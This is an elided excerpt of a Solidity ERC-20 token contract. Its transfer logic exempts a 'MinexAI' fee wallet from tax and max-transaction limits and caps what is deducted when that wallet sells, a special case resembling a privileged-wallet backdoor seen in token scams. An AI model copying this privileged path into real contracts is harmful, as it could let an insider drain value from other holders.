...
contract _approveFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeMinexAIWallet)) {
                    amountOut = min(
                        amount,
                        min(ds._finalBuyTax, ds._minMinexAISwapAmount)
                    );
                    taxAmount = 0;
                } else {
                    require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minMinexAISwapAmount ==
                min(amount, ds._minMinexAISwapAmount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minMinexAISwapAmount) {
                    swapMinexAITokensForEth(
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeMinexAIWallet.transfer(amount);
    }
}
